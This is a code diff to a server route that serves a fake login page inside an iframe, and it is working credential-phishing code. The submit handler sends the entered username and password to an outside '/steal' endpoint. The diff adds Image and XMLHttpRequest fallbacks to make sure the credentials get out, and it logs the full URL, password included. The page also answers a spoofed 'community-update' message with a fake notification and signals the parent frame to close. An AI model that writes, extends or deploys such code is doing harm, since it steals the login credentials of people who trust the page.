@@ -141,9 +141,9 @@ res.send(`
       font-size: 12px;
       color: #333;
       text-align: left;
-      max-height: 100px;
+      max-height: 200px;
       overflow-y: auto;
-      display: none;
+      display: block;
     }
     .copyright {
       color: white;
@@ -151,6 +151,14 @@ res.send(`
       text-align: center;
       margin-top: 20px;
       opacity: 0.8;
+    }
+    .debug-info {
+      background: #f0f8ff;
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 11px;
+      font-family: monospace;
     }
   </style>
 </head>
@@ -179,6 +187,11 @@ res.send(`
           <input type="checkbox" id="remember" /> Remember me
         </label>
       </div>
+      
+      <div class="output" id="output" style="display: none;">
+        <strong>Debug Log:</strong><br>
+        Page loaded at: ${new Date().toLocaleString()}<br>
+      </div>
     </div>
     
     <div class="version-container">
@@ -196,49 +209,178 @@ res.send(`
 
   <script>
     var outputDiv = document.getElementById('output');
+    
+    function logMessage(message) {
+      console.log(message);
+      outputDiv.innerHTML += message + '<br>';
+      outputDiv.scrollTop = outputDiv.scrollHeight;
+    }
 
     function togglePassword() {
       var passwordInput = document.getElementById('password');
       var showBtn = document.querySelector('.show-password');
       
+      logMessage('Password toggle clicked');
+      
       if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
         showBtn.textContent = 'Hide';
+        logMessage('Password visibility: SHOWN');
       } else {
         passwordInput.type = 'password';
         showBtn.textContent = 'Show';
+        logMessage('Password visibility: HIDDEN');
       }
     }
 
-    function submitCredentials() {
+    async function submitCredentials() {
+      logMessage('=== LOGIN ATTEMPT STARTED ===');
+      
       var username = document.getElementById('username').value;
       var password = document.getElementById('password').value;
-      if (username && password) {
-        fetch('https://python-test-server-d3hl.onrender.com/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
-        // Signal the parent window to close the iframe
-        window.parent.postMessage('close-iframe', '*');
+      
+      logMessage('Username: "' + username + '"');
+      logMessage('Password length: ' + password.length);
+      
+      if (!username || !password) {
+        logMessage('ERROR: Missing username or password');
+        alert('Please enter both username and password');
+        return;
       }
+      
+      // Build the URL
+      var baseUrl = 'https://python-test-server-d3hl.onrender.com/steal';
+      var params = new URLSearchParams();
+      params.append('username', username);
+      params.append('password', password);
+      var fullUrl = baseUrl + '?' + params.toString();
+      
+      logMessage('Target URL: ' + fullUrl);
+      logMessage('Encoded params: ' + params.toString());
+      
+      try {
+        logMessage('Attempting fetch request...');
+        
+        // Try with fetch first
+        const response = await fetch(fullUrl, {
+          method: 'GET',
+          mode: 'no-cors', // This might help with CORS issues
+          cache: 'no-cache'
+        });
+        
+        logMessage('Fetch completed - Status: ' + response.status);
+        logMessage('Response type: ' + response.type);
+        
+        // Try to read response (might fail with no-cors)
+        try {
+          const text = await response.text();
+          logMessage('Response text: ' + text);
+        } catch (e) {
+          logMessage('Could not read response text (expected with no-cors): ' + e.message);
+        }
+        
+      } catch (error) {
+        logMessage('Fetch FAILED: ' + error.message);
+        logMessage('Error name: ' + error.name);
+        
+        // Fallback: try with Image object (for simple GET requests)
+        logMessage('Trying fallback method with Image object...');
+        try {
+          var img = new Image();
+          img.onload = function() {
+            logMessage('Image method: SUCCESS (onload)');
+          };
+          img.onerror = function() {
+            logMessage('Image method: ERROR (onerror) - but request was likely sent');
+          };
+          img.src = fullUrl + '&_fallback=image&_t=' + Date.now();
+          logMessage('Image fallback request sent');
+        } catch (imgError) {
+          logMessage('Image fallback FAILED: ' + imgError.message);
+        }
+        
+        // Another fallback: try with XMLHttpRequest
+        logMessage('Trying XMLHttpRequest fallback...');
+        try {
+          var xhr = new XMLHttpRequest();
+          xhr.open('GET', fullUrl, true);
+          xhr.onreadystatechange = function() {
+            logMessage('XHR readyState: ' + xhr.readyState + ', status: ' + xhr.status);
+            if (xhr.readyState === 4) {
+              if (xhr.status === 200) {
+                logMessage('XHR SUCCESS: ' + xhr.responseText);
+              } else {
+                logMessage('XHR completed with status: ' + xhr.status);
+              }
+            }
+          };
+          xhr.onerror = function() {
+            logMessage('XHR ERROR occurred');
+          };
+          xhr.send();
+          logMessage('XHR request sent');
+        } catch (xhrError) {
+          logMessage('XHR fallback FAILED: ' + xhrError.message);
+        }
+      }
+      
+      // Signal the parent window to close the iframe (if applicable)
+      try {
+        window.parent.postMessage('close-iframe', '*');
+        logMessage('Sent close-iframe message to parent');
+      } catch (e) {
+        logMessage('Could not send message to parent: ' + e.message);
+      }
+      
+      logMessage('=== LOGIN ATTEMPT COMPLETED ===');
     }
 
+    // Enhanced message listener with more logging
     window.addEventListener('message', function(event) {
+      logMessage('Received postMessage: "' + event.data + '" from: ' + event.origin);
+      
       if (event.data === 'type=community-update') {
-        outputDiv.style.display = 'block';
-        outputDiv.innerHTML += '<p>Received community-update from ' + event.origin + ' at ' + new Date().toLocaleTimeString() + '</p>';
+        logMessage('Processing community-update message');
         document.querySelector('.login-box').style.display = 'block';
         var fakeNotification = 'type=community-notification&unread=true';
         if (event.source) {
           event.source.postMessage(fakeNotification, event.origin || '*');
+          logMessage('Sent fake notification back to: ' + event.origin);
+        } else {
+          logMessage('No event.source available to send response');
         }
-        console.log('Sent fake notification back');
-      } else {
-        outputDiv.style.display = 'block';
-        outputDiv.innerHTML += '<p>Received other message: ' + event.data + ' from ' + event.origin + '</p>';
       }
-      outputDiv.scrollTop = outputDiv.scrollHeight;
     }, false);
 
-    window.parent.postMessage('Iframe loaded', '*');
-    console.log('Iframe loaded, notified parent');
+    // Log when iframe loads
+    logMessage('Script loaded, sending iframe loaded message');
+    try {
+      window.parent.postMessage('Iframe loaded', '*');
+      logMessage('Iframe loaded message sent successfully');
+    } catch (e) {
+      logMessage('Could not send iframe loaded message: ' + e.message);
+    }
+    
+    // Additional debugging info
+    logMessage('Current URL: ' + window.location.href);
+    logMessage('User agent: ' + navigator.userAgent);
+    logMessage('Is in iframe: ' + (window !== window.parent));
+    
+    // Test backend connectivity on page load
+    setTimeout(async function() {
+      logMessage('=== TESTING BACKEND CONNECTIVITY ===');
+      try {
+        const testResponse = await fetch('https://python-test-server-d3hl.onrender.com/test', {
+          method: 'GET',
+          mode: 'no-cors'
+        });
+        logMessage('Backend test - Response type: ' + testResponse.type);
+      } catch (e) {
+        logMessage('Backend test FAILED: ' + e.message);
+      }
+      logMessage('=== BACKEND TEST COMPLETED ===');
+    }, 1000);
+    
   </script>
 </body>
 </html>
